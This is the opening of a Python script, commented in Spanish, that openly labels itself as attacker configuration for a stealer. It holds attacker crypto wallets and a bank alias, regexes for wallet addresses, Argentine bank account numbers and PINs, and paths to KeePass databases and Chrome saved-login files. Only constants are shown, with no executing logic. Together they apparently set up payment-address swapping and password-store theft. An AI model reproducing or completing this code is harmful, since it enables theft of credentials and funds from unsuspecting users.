#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#Datos del atacante
atacante_wallet_btc = "1ACC62RS9hg8bHGcfUUq5hY2MAgsUcCo59"
atacante_wallet_eth = "0xd195958Cfb0994e2B64f0452A3E61db6999f5356"
atacante_wallet_xmr = "47smjUgdQycN9HUDDbQAy5anXpGiXSFhiStTfrsn3rMy369kp7YJ2xVMPLWXe8cuExQkXgLQJfrnXUrZkP2rvMi6PWVEqyM"
atacante_cbu_cvu = "1430000000000000000000"
atacante_alias = "MEJOR.STEALER.MUNDIAL"

#Expresiones regulares
patron_wallet_btc = "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"
patron_wallet_eth = "^0x[a-fA-F0-9]{40}$"
patron_wallet_xmr = "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}"
patron_cbu_cvu = "^[0-9]{22}$"
patron_pin = "^[0-9]{4}$"
patron_alias = "([a-zA-Z0-9]+)(\.[a-zA-Z0-9]+)(\.[a-zA-Z0-9]+)"
patron_keepass_windows = "C:\\Users\\**\\*.kdbx"
patron_keepass_linux = "/home/**/*.kdbx"
patron_chrome_linux = "~/.config/google-chrome/Profile 1/Login Data"
patron_chrome_windows = "C:\\Users\\**\\Google\\Chrome\\User Data\\Default\\Login Data"